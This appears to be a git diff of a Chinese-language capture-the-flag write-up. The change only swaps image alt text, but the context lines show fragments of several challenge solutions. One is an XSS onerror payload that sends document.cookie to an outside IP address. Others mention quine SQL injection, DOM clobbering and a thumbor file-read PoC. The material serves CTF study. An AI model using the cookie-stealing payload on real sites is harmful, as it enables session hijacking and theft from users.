@@ -21,7 +21,7 @@ docker compose up -d
 
 我看到bot就丁真xss，基本应用代码都是这么写的，flag在cookie里面，再来仔细看看代码
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 直接进行替换，所以拼接绕过
 
@@ -41,7 +41,7 @@ x" onerror="window.open('http://156.238.233.9:9999/?p='+document.cookie)
 
 别忘了report
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 ## supersqli
 
@@ -250,15 +250,15 @@ Content-Disposition: form-data; name="password";
 ------WebKitFormBoundaryYvbD7Ke5rzcVI8sN--
 ```
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 成功延时了，但是还是无法查询flag，仔细查看代码
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 限制了为`admin`，有没有办法想mysql一样做到说能够伪造呢
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 类似的这道题，在代码中明确说明了列的创建，password列最多20个字符，这个被称为quine注入，学习一下，简单的说，就是查询语句和查询出来的答案保持一致
 
@@ -528,7 +528,7 @@ app.listen(1337, () => {
 
 设置了每分钟只被请求两次，如果服务不繁忙就正常利用`visit`来处理`url`，全局搜索`extension`，关键代码如下
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
 首先我们要满足`browser.extension.inIncognitoContext`为true，其次这个拓展就会访问`/flag`，其中有flag，这里是最大的误区，我一开始认为是平常的xss，让bot去访问内部`/flag`再带出来，后面发现不是，绕过的话，我们可以利用**DOM Clobbering**攻击去对全局变量的劫持覆盖
 
@@ -589,7 +589,7 @@ python3 exp.py
 http://156.xxx.xxx.x3:19006/
 ```
 
-![1](./assets/007.jpg)
+![image](./assets/007.jpg)
 
 ## thumbor 1
 
@@ -609,7 +609,7 @@ pip install pypng
 python3 poc.py parse -i ans.png
 ```
 
-![1](./assets/008.jpg)
+![image](./assets/008.jpg)
 
 复现成功，但是对于本题，起好docker之后我们进入docker来找一下路由先，根本看不懂😭，问GPT，知道访问`/healthcheck`，如果 `thumbor` 正常工作，它应该返回 `WORKING`。我们的目的是找路由，在这里面有好多地方，所以思索了一下还是写个命令来进行检索
 
@@ -617,7 +617,7 @@ python3 poc.py parse -i ans.png
 grep -Erni "route|url|handler|add_handler|path" .
 ```
 
-![1](./assets/009.jpg)
+![image](./assets/009.jpg)
 
 知道路由之后我们就可以把文件来整一下了，并且也知道了格式，可以尝试一下
 
@@ -641,14 +641,14 @@ identify -verbose ans2.png
 scp -r -P 8776 "C:\Users\baozhongqi\Desktop\pngout.png" root@156.238.233.9:/var/www/html/
 ```
 
-![1](./assets/010.jpg)
+![image](./assets/010.jpg)
 
 ```python
 text="54504354467b2e2e2e7d0a"
 print(bytes.fromhex(text).decode("utf-8"))
 ```
 
-![1](./assets/011.jpg)
+![image](./assets/011.jpg)
 
 然后打了一遍靶机也拿到flag了
 
@@ -675,7 +675,7 @@ encoding="UTF-8">
 </svg>
 ```
 
-![1](./assets/012.jpg)
+![image](./assets/012.jpg)
 
 读flag就好了
 
